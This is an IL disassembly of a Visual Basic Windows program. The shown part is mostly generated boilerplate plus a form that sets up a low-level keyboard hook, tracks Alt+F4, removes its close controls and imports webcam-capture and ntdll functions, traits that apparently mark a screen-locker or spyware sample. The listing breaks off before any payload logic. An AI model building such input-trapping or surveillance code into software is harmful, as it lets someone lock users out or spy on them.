
//  Microsoft (R) .NET Framework IL Disassembler.  Version 4.6.1055.0
//  Copyright (c) Microsoft Corporation.  All rights reserved.



// Metadata version: v2.0.50727
.module extern user32.dll
.module extern user32
.module extern kernel32.dll
.module extern kernel32
.module extern wintrust.dll
.module extern avicap32.dll
.module extern KERNEL32.DLL
.module extern winmm.dll
.module extern gdi32.dll
.module extern gdi32
.module extern ntdll
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern Microsoft.VisualBasic
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 8:0:0:0
}
.assembly extern System.Windows.Forms
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern System.Drawing
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 2:0:0:0
}
.assembly Application
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.

  // --- The following custom attribute is added automatically, do not uncomment -------
  //  .custom instance void [mscorlib]System.Diagnostics.DebuggableAttribute::.ctor(valuetype [mscorlib]System.Diagnostics.DebuggableAttribute/DebuggingModes) = ( 01 00 02 00 00 00 00 00 ) 

  .custom instance void [mscorlib]System.Reflection.AssemblyTitleAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyDescriptionAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyCompanyAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyProductAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyCopyrightAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyTrademarkAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.InteropServices.GuidAttribute::.ctor(string) = ( 01 00 24 31 46 38 42 32 32 37 31 2D 37 33 30 33   // ..$1F8B2271-7303
                                                                                                  2D 34 46 32 46 2D 38 42 34 42 2D 35 35 36 41 35   // -4F2F-8B4B-556A5
                                                                                                  46 43 42 33 43 38 36 00 00 )                      // FCB3C86..
  .custom instance void [mscorlib]System.Reflection.AssemblyFileVersionAttribute::.ctor(string) = ( 01 00 07 31 2E 30 2E 30 2E 30 00 00 )             // ...1.0.0.0..
  .hash algorithm 0x00008004
  .ver 1:0:0:0
}
.module Application.exe
// MVID: {4AA4F0F0-82DC-407D-8A44-5A37EAC070B8}
.imagebase 0x00400000
.file alignment 0x00000200
.stackreserve 0x00100000
.subsystem 0x0002       // WINDOWS_GUI
.corflags 0x00000003    //  ILONLY 32BITREQUIRED
// Image base: 0x00590000


// =============== CLASS MEMBERS DECLARATION ===================

.class private auto ansi My.MyApplication
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ApplicationBase
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ApplicationBase::.ctor()
    IL_0006:  ret
  } // end of method MyApplication::.ctor

} // end of class My.MyApplication

.class private auto ansi My.MyComputer
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_0006:  ret
  } // end of method MyComputer::.ctor

} // end of class My.MyComputer

.class private auto ansi sealed beforefieldinit My.MyProject
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.HideModuleNameAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .class auto ansi sealed nested assembly MyWebServices
         extends [mscorlib]System.Object
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyGroupCollectionAttribute::.ctor(string,
                                                                                                         string,
                                                                                                         string,
                                                                                                         string) = ( 01 00 34 53 79 73 74 65 6D 2E 57 65 62 2E 53 65   // ..4System.Web.Se
                                                                                                                     72 76 69 63 65 73 2E 50 72 6F 74 6F 63 6F 6C 73   // rvices.Protocols
                                                                                                                     2E 53 6F 61 70 48 74 74 70 43 6C 69 65 6E 74 50   // .SoapHttpClientP
                                                                                                                     72 6F 74 6F 63 6F 6C 12 43 72 65 61 74 65 5F 5F   // rotocol.Create__
                                                                                                                     49 6E 73 74 61 6E 63 65 5F 5F 13 44 69 73 70 6F   // Instance__.Dispo
                                                                                                                     73 65 5F 5F 49 6E 73 74 61 6E 63 65 5F 5F 00 00   // se__Instance__..
                                                                                                                     00 ) 
    .method public hidebysig strict virtual 
            instance bool  Equals(object o) cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       13 (0xd)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  ldarg.1
      IL_0002:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0007:  call       instance bool [mscorlib]System.Object::Equals(object)
      IL_000c:  ret
    } // end of method MyWebServices::Equals

    .method public hidebysig strict virtual 
            instance int32  GetHashCode() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance int32 [mscorlib]System.Object::GetHashCode()
      IL_0006:  ret
    } // end of method MyWebServices::GetHashCode

    .method assembly hidebysig instance class [mscorlib]System.Type 
            GetType() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       11 (0xb)
      .maxstack  8
      IL_0000:  ldtoken    My.MyProject/MyWebServices
      IL_0005:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_000a:  ret
    } // end of method MyWebServices::GetType

    .method public hidebysig strict virtual 
            instance string  ToString() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance string [mscorlib]System.Object::ToString()
      IL_0006:  ret
    } // end of method MyWebServices::ToString

    .method private static !!T  Create__Instance__<.ctor T>(!!T 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       20 (0x14)
      .maxstack  1
      .locals init (!!T V_0)
      IL_0000:  ldarg.0
      IL_0001:  box        !!T
      IL_0006:  brtrue.s   IL_0010

      IL_0008:  call       !!0 [mscorlib]System.Activator::CreateInstance<!!0>()
      IL_000d:  stloc.0
      IL_000e:  br.s       IL_0012

      IL_0010:  ldarg.0
      IL_0011:  stloc.0
      IL_0012:  ldloc.0
      IL_0013:  ret
    } // end of method MyWebServices::Create__Instance__

    .method private instance void  Dispose__Instance__<T>(!!T& 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       8 (0x8)
      .maxstack  8
      IL_0000:  ldarg.1
      IL_0001:  initobj    !!T
      IL_0007:  ret
    } // end of method MyWebServices::Dispose__Instance__

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method MyWebServices::.ctor

  } // end of class MyWebServices

  .class auto ansi sealed nested assembly ThreadSafeObjectProvider`1<.ctor T>
         extends [mscorlib]System.Object
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
    .field private static !T m_ThreadStaticValue
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.ThreadStaticAttribute::.ctor() = ( 01 00 00 00 ) 
    .method assembly specialname instance !T 
            get_GetInstance() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       28 (0x1c)
      .maxstack  8
      IL_0000:  ldsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0005:  box        !T
      IL_000a:  brtrue.s   IL_0016

      IL_000c:  call       !!0 [mscorlib]System.Activator::CreateInstance<!T>()
      IL_0011:  stsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0016:  ldsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_001b:  ret
    } // end of method ThreadSafeObjectProvider`1::get_GetInstance

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method ThreadSafeObjectProvider`1::.ctor

    .property instance !T GetInstance()
    {
      .get instance !T My.MyProject/ThreadSafeObjectProvider`1::get_GetInstance()
    } // end of property ThreadSafeObjectProvider`1::GetInstance
  } // end of class ThreadSafeObjectProvider`1

  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> m_ComputerObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> m_AppObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> m_UserObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> m_MyWebServicesObjectProvider
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       41 (0x29)
    .maxstack  8
    IL_0000:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer>::.ctor()
    IL_0005:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> My.MyProject::m_ComputerObjectProvider
    IL_000a:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication>::.ctor()
    IL_000f:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> My.MyProject::m_AppObjectProvider
    IL_0014:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::.ctor()
    IL_0019:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> My.MyProject::m_UserObjectProvider
    IL_001e:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices>::.ctor()
    IL_0023:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> My.MyProject::m_MyWebServicesObjectProvider
    IL_0028:  ret
  } // end of method MyProject::.cctor

  .method assembly specialname static class My.MyComputer 
          get_Computer() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> My.MyProject::m_ComputerObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_Computer

  .method assembly specialname static class My.MyApplication 
          get_Application() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> My.MyProject::m_AppObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_Application

  .method assembly specialname static class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User 
          get_User() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> My.MyProject::m_UserObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_User

  .method assembly specialname static class My.MyProject/MyWebServices 
          get_WebServices() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> My.MyProject::m_MyWebServicesObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_WebServices

  .property class My.MyComputer Computer()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0B 4D 79 2E 43 6F 6D 70 75 74 65 72 00 00 ) // ...My.Computer..
    .get class My.MyComputer My.MyProject::get_Computer()
  } // end of property MyProject::Computer
  .property class My.MyApplication Application()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 41 70 70 6C 69 63 61 74 69 6F   // ...My.Applicatio
                                                                                                       6E 00 00 )                                        // n..
    .get class My.MyApplication My.MyProject::get_Application()
  } // end of property MyProject::Application
  .property class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User
          User()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 07 4D 79 2E 55 73 65 72 00 00 )             // ...My.User..
    .get class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User My.MyProject::get_User()
  } // end of property MyProject::User
  .property class My.MyProject/MyWebServices
          WebServices()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 57 65 62 53 65 72 76 69 63 65   // ...My.WebService
                                                                                                       73 00 00 )                                        // s..
    .get class My.MyProject/MyWebServices My.MyProject::get_WebServices()
  } // end of property MyProject::WebServices
} // end of class My.MyProject

.class private auto ansi Resources
       extends [mscorlib]System.Object
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 33 53 79 73 74 65 6D 2E 52 65 73 6F 75 72   // ..3System.Resour
                                                                                                  63 65 73 2E 54 6F 6F 6C 73 2E 53 74 72 6F 6E 67   // ces.Tools.Strong
                                                                                                  6C 79 54 79 70 65 64 52 65 73 6F 75 72 63 65 42   // lyTypedResourceB
                                                                                                  75 69 6C 64 65 72 08 31 35 2E 30 2E 30 2E 30 00   // uilder.15.0.0.0.
                                                                                                  00 ) 
  .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private static class [mscorlib]System.Resources.ResourceManager resourceMan
  .field private static class [mscorlib]System.Globalization.CultureInfo resourceCulture
  .method assembly specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method Resources::.ctor

  .method assembly specialname static class [mscorlib]System.Resources.ResourceManager 
          get_ResourceManager() cil managed
  {
    // Code size       49 (0x31)
    .maxstack  8
    IL_0000:  ldsfld     class [mscorlib]System.Resources.ResourceManager Resources::resourceMan
    IL_0005:  ldnull
    IL_0006:  call       bool [mscorlib]System.Object::ReferenceEquals(object,
                                                                       object)
    IL_000b:  brfalse.s  IL_002b

    IL_000d:  ldstr      "Resources"
    IL_0012:  ldtoken    Resources
    IL_0017:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_001c:  callvirt   instance class [mscorlib]System.Reflection.Assembly [mscorlib]System.Type::get_Assembly()
    IL_0021:  newobj     instance void [mscorlib]System.Resources.ResourceManager::.ctor(string,
                                                                                         class [mscorlib]System.Reflection.Assembly)
    IL_0026:  stsfld     class [mscorlib]System.Resources.ResourceManager Resources::resourceMan
    IL_002b:  ldsfld     class [mscorlib]System.Resources.ResourceManager Resources::resourceMan
    IL_0030:  ret
  } // end of method Resources::get_ResourceManager

  .method assembly specialname static class [mscorlib]System.Globalization.CultureInfo 
          get_Culture() cil managed
  {
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  ldsfld     class [mscorlib]System.Globalization.CultureInfo Resources::resourceCulture
    IL_0005:  ret
  } // end of method Resources::get_Culture

  .method assembly specialname static void 
          set_Culture(class [mscorlib]System.Globalization.CultureInfo Value) cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  stsfld     class [mscorlib]System.Globalization.CultureInfo Resources::resourceCulture
    IL_0006:  ret
  } // end of method Resources::set_Culture

  .property class [mscorlib]System.Resources.ResourceManager
          ResourceManager()
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 02 00 00 00 00 00 ) 
    .get class [mscorlib]System.Resources.ResourceManager Resources::get_ResourceManager()
  } // end of property Resources::ResourceManager
  .property class [mscorlib]System.Globalization.CultureInfo
          Culture()
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 02 00 00 00 00 00 ) 
    .get class [mscorlib]System.Globalization.CultureInfo Resources::get_Culture()
    .set void Resources::set_Culture(class [mscorlib]System.Globalization.CultureInfo)
  } // end of property Resources::Culture
} // end of class Resources

.class public auto ansi Form1
       extends [System.Windows.Forms]System.Windows.Forms.Form
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.DesignerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .class auto ansi sealed nested private SW
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname int32 value__
    .field public static literal valuetype Form1/SW Hide = int32(0x00000000)
    .field public static literal valuetype Form1/SW Normal = int32(0x00000001)
    .field public static literal valuetype Form1/SW ShowMinimized = int32(0x00000002)
    .field public static literal valuetype Form1/SW ShowMaximized = int32(0x00000003)
    .field public static literal valuetype Form1/SW ShowNoActivate = int32(0x00000004)
    .field public static literal valuetype Form1/SW Show = int32(0x00000005)
    .field public static literal valuetype Form1/SW Minimize = int32(0x00000006)
    .field public static literal valuetype Form1/SW ShowMinNoActive = int32(0x00000007)
    .field public static literal valuetype Form1/SW ShowNA = int32(0x00000008)
    .field public static literal valuetype Form1/SW Restore = int32(0x00000009)
    .field public static literal valuetype Form1/SW ShowDefault = int32(0x0000000A)
    .field public static literal valuetype Form1/SW ForceMinimize = int32(0x0000000B)
    .field public static literal valuetype Form1/SW Max = int32(0x0000000B)
  } // end of class SW

  .class auto ansi sealed nested public LowLevelKeyboardProc
         extends [mscorlib]System.MulticastDelegate
  {
    .method public specialname rtspecialname 
            instance void  .ctor(object TargetObject,
                                 native int TargetMethod) runtime managed
    {
    } // end of method LowLevelKeyboardProc::.ctor

    .method public newslot strict virtual 
            instance class [mscorlib]System.IAsyncResult 
            BeginInvoke(int32 nCode,
                        native int wParam,
                        native int lParam,
                        class [mscorlib]System.AsyncCallback DelegateCallback,
                        object DelegateAsyncState) runtime managed
    {
    } // end of method LowLevelKeyboardProc::BeginInvoke

    .method public newslot strict virtual 
            instance native int  EndInvoke(class [mscorlib]System.IAsyncResult DelegateAsyncResult) runtime managed
    {
    } // end of method LowLevelKeyboardProc::EndInvoke

    .method public newslot strict virtual 
            instance native int  Invoke(int32 nCode,
                                        native int wParam,
                                        native int lParam) runtime managed
    {
    } // end of method LowLevelKeyboardProc::Invoke

  } // end of class LowLevelKeyboardProc

  .field private class [System]System.ComponentModel.IContainer components
  .field private bool keyPressAltF4
  .field private static literal int64 KEYEVENTF_EXTENDEDKEY = int64(0x1)
  .field private static literal int64 KEYEVENTF_KEYUP = int64(0x2)
  .field private static literal uint8 VK_LWIN = uint8(0x5B)
  .field private static literal int32 WH_KEYBOARD_LL = int32(0x0000000D)
  .field public static literal int32 WM_KEYUP = int32(0x00000101)
  .field private static class Form1/LowLevelKeyboardProc _proc
  .field private static native int _hookID
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       38 (0x26)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldarg.0
    IL_0008:  ldftn      instance void Form1::Form1_Load(object,
                                                         class [mscorlib]System.EventArgs)
    IL_000e:  newobj     instance void [mscorlib]System.EventHandler::.ctor(object,
                                                                            native int)
    IL_0013:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::add_Load(class [mscorlib]System.EventHandler)
    IL_0018:  ldarg.0
    IL_0019:  ldc.i4.0
    IL_001a:  stfld      bool Form1::keyPressAltF4
    IL_001f:  ldarg.0
    IL_0020:  call       instance void Form1::InitializeComponent()
    IL_0025:  ret
  } // end of method Form1::.ctor

  .method family hidebysig strict virtual 
          instance void  Dispose(bool disposing) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerNonUserCodeAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       33 (0x21)
    .maxstack  2
    .try
    {
      IL_0000:  ldarg.1
      IL_0001:  brfalse.s  IL_0016

      IL_0003:  ldarg.0
      IL_0004:  ldfld      class [System]System.ComponentModel.IContainer Form1::components
      IL_0009:  brfalse.s  IL_0016

      IL_000b:  ldarg.0
      IL_000c:  ldfld      class [System]System.ComponentModel.IContainer Form1::components
      IL_0011:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_0016:  leave.s    IL_0020

    }  // end .try
    finally
    {
      IL_0018:  ldarg.0
      IL_0019:  ldarg.1
      IL_001a:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::Dispose(bool)
      IL_001f:  endfinally
    }  // end handler
    IL_0020:  ret
  } // end of method Form1::Dispose

  .method private instance void  InitializeComponent() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       164 (0xa4)
    .maxstack  3
    IL_0000:  ldarg.0
    IL_0001:  newobj     instance void [System]System.ComponentModel.Container::.ctor()
    IL_0006:  stfld      class [System]System.ComponentModel.IContainer Form1::components
    IL_000b:  ldarg.0
    IL_000c:  call       instance void [System.Windows.Forms]System.Windows.Forms.Control::SuspendLayout()
    IL_0011:  ldarg.0
    IL_0012:  ldc.r4     6.
    IL_0017:  ldc.r4     13.
    IL_001c:  newobj     instance void [System.Drawing]System.Drawing.SizeF::.ctor(float32,
                                                                                   float32)
    IL_0021:  call       instance void [System.Windows.Forms]System.Windows.Forms.ContainerControl::set_AutoScaleDimensions(valuetype [System.Drawing]System.Drawing.SizeF)
    IL_0026:  ldarg.0
    IL_0027:  ldc.i4.1
    IL_0028:  call       instance void [System.Windows.Forms]System.Windows.Forms.ContainerControl::set_AutoScaleMode(valuetype [System.Windows.Forms]System.Windows.Forms.AutoScaleMode)
    IL_002d:  ldarg.0
    IL_002e:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Aqua()
    IL_0033:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Form::set_BackColor(valuetype [System.Drawing]System.Drawing.Color)
    IL_0038:  ldarg.0
    IL_0039:  ldc.i4     0x24f
    IL_003e:  ldc.i4     0x15b
    IL_0043:  newobj     instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                  int32)
    IL_0048:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_ClientSize(valuetype [System.Drawing]System.Drawing.Size)
    IL_004d:  ldarg.0
    IL_004e:  ldc.i4.0
    IL_004f:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_ControlBox(bool)
    IL_0054:  ldarg.0
    IL_0055:  ldc.i4.0
    IL_0056:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_FormBorderStyle(valuetype [System.Windows.Forms]System.Windows.Forms.FormBorderStyle)
    IL_005b:  ldarg.0
    IL_005c:  ldc.i4.1
    IL_005d:  call       instance void [System.Windows.Forms]System.Windows.Forms.Form::set_KeyPreview(bool)
